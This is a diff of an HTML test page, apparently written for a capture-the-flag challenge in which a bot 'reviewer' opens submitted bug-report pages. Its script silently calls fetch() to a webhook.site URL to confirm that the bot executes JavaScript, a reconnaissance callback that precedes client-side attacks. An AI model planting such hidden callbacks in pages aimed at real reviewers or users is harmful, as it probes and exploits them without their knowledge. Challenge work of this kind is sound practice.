@@ -1,22 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>UTOPIA-BUG-REPORT-TEST</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bug Report Test Page</title>
+
+  <script>
+    // Señal visible si alguien abre la página (incluye el bot)
+    document.title = "UTOPIA REVIEWER ACTIVE";
+  </script>
+
+  <style>
+    body { font-family: Arial, sans-serif; padding: 24px; line-height: 1.4; }
+    code { background: #f2f2f2; padding: 2px 6px; border-radius: 6px; }
+    .ok { margin-top: 12px; padding: 10px 12px; border: 1px solid #ddd; border-radius: 10px; }
+  </style>
 </head>
+
 <body>
   <h1>Bug Report Test Page</h1>
-  <p>If you see this, the page is being rendered by the reviewer.</p>
+  <p>
+    If you see this, the page is being rendered by the reviewer.
+  </p>
 
+  <div class="ok">
+    <p><b>Status:</b> Page loaded.</p>
+    <p><b>Timestamp:</b> <code id="ts"></code></p>
+  </div>
+
+  <h2>Useful links</h2>
   <ul>
-    <li><a href="curl -sS -i https://9f7f18303cdb2d4f.chal.ctf.ae/ | head -n 10">Utopia Portal</a></li>
-    <li><a href="curl -sS -i https://9f7f18303cdb2d4f.chal.ctf.ae/report | head -n 10">Report Viewer</a></li>
+    <li><a href="https://9f7f18303cdb2d4f.chal.ctf.ae/" target="_blank" rel="noopener">Utopia Portal</a></li>
+    <li><a href="https://9f7f18303cdb2d4f.chal.ctf.ae/services/utoid" target="_blank" rel="noopener">UtoID Service</a></li>
   </ul>
 
   <script>
+    // Timestamp para ver cambios en tu HTML rápidamente
+    document.getElementById("ts").textContent = new Date().toISOString();
+
+    // Confirmación silenciosa: si el bot ejecuta JS, verás esto en webhook.site
+    fetch("https://webhook.site/a4053a95-57cc-4688-a72d-9b4d9ec0672b?js=executed&ts=" + encodeURIComponent(new Date().toISOString()))
+      .catch(() => {});
+
     console.log("Bug report page loaded");
   </script>
 </body>
 </html>
+
 
 
